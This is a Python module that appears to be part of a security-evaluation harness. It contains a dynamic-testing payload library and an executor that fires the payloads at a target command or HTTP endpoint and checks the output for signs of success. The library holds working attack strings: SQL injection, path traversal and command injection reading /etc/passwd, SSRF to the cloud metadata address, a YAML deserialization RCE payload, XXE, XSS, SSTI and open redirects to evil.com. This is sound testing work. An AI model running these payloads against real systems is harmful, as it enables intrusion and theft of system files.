"""Dynamic exploit execution (DAST) - payload library + execution harness."""

from __future__ import annotations

import json
import re
import subprocess
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

from pydantic import BaseModel

# executor.py is packages/judge/dast/executor.py -> repo root is 4 levels up.
PAYLOADS_DIR = Path(__file__).resolve().parent.parent.parent.parent / "data"
PAYLOADS_FILE = PAYLOADS_DIR / "exploit_payloads.json"


class ExploitPayload(BaseModel):
    class_id: str
    payload: str
    description: str = ""


@dataclass
class DASTResult:
    exploit_class: str
    payload: str
    success: bool
    stdout: str = ""
    stderr: str = ""
    execution_time_ms: int = 0
    evidence: list[str] = field(default_factory=list)

    def as_dict(self) -> dict:
        return {
            "exploit_class": self.exploit_class,
            "payload": self.payload,
            "success": self.success,
            "stdout": self.stdout[:4000],
            "stderr": self.stderr[:4000],
            "execution_time_ms": self.execution_time_ms,
            "evidence": self.evidence,
        }


class PayloadLibrary:
    """Loads and selects exploit payloads per vulnerability class."""

    def __init__(self, path: Path | None = None):
        self.path = Path(path) if path is not None else PAYLOADS_FILE
        self._payloads: dict[str, list[ExploitPayload]] = {}
        if self.path.exists():
            raw = json.loads(self.path.read_text())
            for class_id, items in raw.items():
                self._payloads[class_id] = [ExploitPayload(class_id=class_id, **it) for it in items]

    def classes(self) -> list[str]:
        return sorted(self._payloads)

    def get(self, class_id: str, index: int = 0) -> ExploitPayload:
        payloads = self._payloads.get(class_id, [])
        if not payloads:
            raise KeyError(f"No payloads for vulnerability class: {class_id}")
        return payloads[index % len(payloads)]

    def all(self, class_id: str) -> list[ExploitPayload]:
        return self._payloads.get(class_id, [])


class StaticPayloadLibrary(PayloadLibrary):
    """In-memory fallback payload library (used when data file is absent)."""

    STATIC_PAYLOADS = {
        "SQLi": [
            ("' OR '1'='1' --", "Classic tautology bypass"),
            ("1' UNION SELECT username, password FROM users--", "Union extraction"),
            ("admin'--", "Comment-based auth bypass"),
        ],
        "PathTraversal": [
            ("../../../../etc/passwd", "Directory escape to passwd"),
            ("....//....//....//etc/passwd", "Encoded traversal"),
            ("%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
        ],
        "CommandInjection": [
            ("; cat /etc/passwd", "Semicolon injection"),
            ("$(cat /etc/passwd)", "Subshell injection"),
            ("| id", "Pipe to id"),
        ],
        "SSRF": [
            ("http://169.254.169.254/latest/meta-data/", "Cloud metadata endpoint"),
            ("http://127.0.0.1/", "Loopback access"),
            ("http://[::1]/", "IPv6 loopback"),
        ],
        "XSS": [
            ("<script>alert(1)</script>", "Script tag"),
            ("<img src=x onerror=alert(1)>", "Event handler"),
        ],
        "Deserialization": [
            ("!!python/object/apply:os.system ['id']", "YAML RCE payload"),
        ],
        "SSTI": [
            ("{{7*7}}", "Template arithmetic probe"),
            ("{{config.items()}}", "Config exposure probe"),
        ],
        "XXE": [
            (
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                "File read via external entity",
            )
        ],
        "OpenRedirect": [
            ("//evil.com/phish", "Protocol-relative redirect"),
            ("/\\\\evil.com/phish", "Backslash bypass"),
        ],
        "PrototypePollution": [
            ('{"__proto__":{"isAdmin":true}}', "Constructor prototype pollution"),
        ],
    }

    def __init__(self, path: Path | None = None):
        super().__init__(path or PAYLOADS_FILE)
        for class_id, items in self.STATIC_PAYLOADS.items():
            if class_id not in self._payloads:
                self._payloads[class_id] = [
                    ExploitPayload(class_id=class_id, payload=p, description=d) for p, d in items
                ]


SUCCESS_PATTERNS: dict[str, list[re.Pattern[str]]] = {
    "SQLi": [re.compile(r'"username"'), re.compile(r"admin", re.I)],
    "PathTraversal": [re.compile(r"root:x:0:0"), re.compile(r"SECRET_DATA_42")],
    "CommandInjection": [re.compile(r"root:x:0:0"), re.compile(r"uid=\d+")],
    "SSRF": [re.compile(r"instance-id"), re.compile(r"ami-id"), re.compile(r"local-ipv4")],
    "XSS": [re.compile(r"<script>", re.I), re.compile(r"Search results for:")],
    "Deserialization": [re.compile(r"uid=\d+"), re.compile(r"root")],
    "SSTI": [re.compile(r"49\b"), re.compile(r"<h1>Hello")],
    "XXE": [re.compile(r"root:x:0:0")],
    "OpenRedirect": [re.compile(r"evil\.com"), re.compile(r"Location:.*/redirect\?url=")],
    "PrototypePollution": [re.compile(r"isAdmin", re.I), re.compile(r"__proto__")],
}


class ExploitExecutor:
    """Runs exploit payloads against a live target process."""

    def __init__(self, payload_library: PayloadLibrary | None = None):
        self.library = payload_library or StaticPayloadLibrary()

    def execute(
        self,
        class_id: str,
        target_command: list[str] | None = None,
        timeout: int = 15,
    ) -> DASTResult:
        """Execute a payload via an arbitrary target command.

        For real evaluation this runs inside the sandbox container against the
        built application; the local default simply echoes the payload with any
        bound app server for smoke purposes.
        """
        payload = self.library.get(class_id)
        cmd = target_command or ["python3", "-c", "print(input())"]
        start = _now_ms()
        proc = subprocess.run(
            cmd,
            input=payload.payload + "\n",
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        elapsed = _now_ms() - start
        evidence = self._match_evidence(class_id, proc.stdout)

        return DASTResult(
            exploit_class=class_id,
            payload=payload.payload,
            success=bool(evidence),
            stdout=proc.stdout,
            stderr=proc.stderr,
            execution_time_ms=elapsed,
            evidence=evidence[:5],
        )

    def execute_http(
        self,
        class_id: str,
        base_url: str,
        endpoint: str = "/",
        param_name: str | None = "name",
        timeout: int = 10,
        payload_override: str | None = None,
        follow_redirects: bool = True,
    ) -> DASTResult:
        """Execute a payload against an HTTP endpoint.

        If param_name is None, sends the payload as a POST body instead of a
        query parameter (for /load, /parse, /merge endpoints).
        """
        payload = self.library.get(class_id)
        actual_payload = payload_override or payload.payload
        if param_name:
            url = f"{base_url}{endpoint}?{param_name}={urllib.parse.quote(actual_payload)}"
            data = None
        else:
            url = f"{base_url}{endpoint}"
            data = actual_payload.encode("utf-8")
        start = _now_ms()
        try:
            req = urllib.request.Request(url, data=data)
            if data:
                req.add_header("Content-Type", "application/octet-stream")
            if not follow_redirects:
                # Manually handle to avoid following redirects
                class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
                    def redirect_request(self, req, fp, code, msg, headers, newurl):
                        raise urllib.error.HTTPError(newurl, code, msg, headers, fp)

                opener = urllib.request.build_opener(NoRedirectHandler)
                resp = opener.open(req, timeout=timeout)
            else:
                resp = urllib.request.urlopen(req, timeout=timeout)
            with resp:
                stdout = resp.read().decode("utf-8", errors="replace")
                stderr = ""
        except urllib.error.HTTPError as e:
            # For redirect detection, 3xx errors contain Location header
            stdout = e.read().decode("utf-8", errors="replace") if e.fp else ""
            location = e.headers.get("Location", "")
            stderr = ""
            if location:
                stdout += f"\nLocation: {location}"
        except Exception as e:
            stdout = ""
            stderr = str(e)
        elapsed = _now_ms() - start
        evidence = self._match_evidence(class_id, stdout)

        return DASTResult(
            exploit_class=class_id,
            payload=actual_payload,
            success=bool(evidence),
            stdout=stdout[:4000],
            stderr=stderr[:4000],
            execution_time_ms=elapsed,
            evidence=evidence[:5],
        )

    def _match_evidence(self, class_id: str, output: str) -> list[str]:
        patterns = SUCCESS_PATTERNS.get(class_id, [])
        return [p.pattern for p in patterns if p.search(output)]


def _now_ms() -> int:

    return int(time.time() * 1000)
